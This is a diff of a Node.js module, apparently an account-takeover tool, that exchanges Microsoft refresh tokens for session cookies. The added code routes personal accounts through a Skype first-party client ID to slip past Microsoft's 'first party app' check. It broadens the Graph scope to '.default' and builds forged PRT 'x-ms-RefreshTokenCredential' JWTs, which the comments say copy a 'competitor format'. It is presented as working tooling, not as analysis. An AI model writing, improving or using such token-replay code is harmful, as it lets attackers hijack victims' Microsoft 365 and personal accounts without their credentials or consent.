@@ -13,8 +13,28 @@ const db = require('../database/connection');
 const config = require('../config/env');
 
 // Microsoft OAuth2 client configuration
-const CLIENT_ID = config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+// For work/school: Office Azure AD app (pre-consented in enterprise tenants)
+// For personal: MSA-compatible app ID (not an Azure AD first-party app)
+const CLIENT_ID = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
 const TENANT = config.AZURE_TENANT || 'common';
+
+// MSA-compatible client ID for personal accounts
+// This is the Skype/MSA app that works with personal (hotmail/outlook/live) accounts
+// Unlike the Office client ID, it does not trigger the "first party app" error on /consumers endpoint
+const MSA_CLIENT_ID = '88196af5-e584-4924-b87d-b752fde2c6e3';
+
+/**
+ * Get the correct client ID based on account type
+ * @param {string} accountType - 'personal' or 'work_school'
+
+ * @returns {string} Client ID */
+function getClientIdForAccountType(accountType) {
+  if (accountType === 'personal') {
+    return MSA_CLIENT_ID;
+  }
+  return CLIENT_ID;
+}
+
 
 // Token endpoint URLs for different account types
 const TOKEN_ENDPOINTS = {
@@ -24,7 +44,7 @@ const TOKEN_ENDPOINTS = {
 };
 
 // OAuth2 scopes for PRT construction
-const PRT_SCOPES = 'openid profile email offline_access User.Read';
+const PRT_SCOPES = 'openid profile email offline_access https://graph.microsoft.com/.default';
 
 
 // Static HMAC key (publicly documented by Microsoft for PRT)
@@ -39,7 +59,7 @@ function b64url(data) {
 }
 
 /**
- * Build x-ms-RefreshTokenCredential PRT JWT (competitor format)
+ * Build x-ms-RefreshTokenCredential PRT JWT
  * This is the core of Microsoft's Primary Refresh Token
  * 
  * The PRT is a signed JWT containing the refresh_token + client_id + scope + tid + uid
@@ -217,7 +237,7 @@ function generateXmsRefreshTokenCredential(tokenResponse, accountType, extraOpts
       };
     }
     
-    // For work/school accounts, build PRT JWT (competitor format)
+    // For work/school accounts, build PRT JWT
     // Only if we have uid (required for PRT)
     if (accountType === 'work_school' && refreshToken && uid && tid) {
       try {
@@ -388,9 +408,12 @@ async function exchangeTokenForCookies(token, targetTenant, accountType, scope) 
 
   for (const endpoint of endpoints) {
     try {
-      console.log('[CookieConverter] Trying endpoint:', endpoint);
+      console.log('[CookieConverter] Trying endpoint:', endpoint, 'with account type:', accountType);
+      
+      // Use MSA-compatible client ID for personal accounts, Azure AD client ID for work/school
+      const currentClientId = getClientIdForAccountType(accountType);
       const params = new URLSearchParams({
-        client_id: CLIENT_ID,
+        client_id: currentClientId,
         grant_type: 'refresh_token',
         refresh_token: token,
         scope: scope,
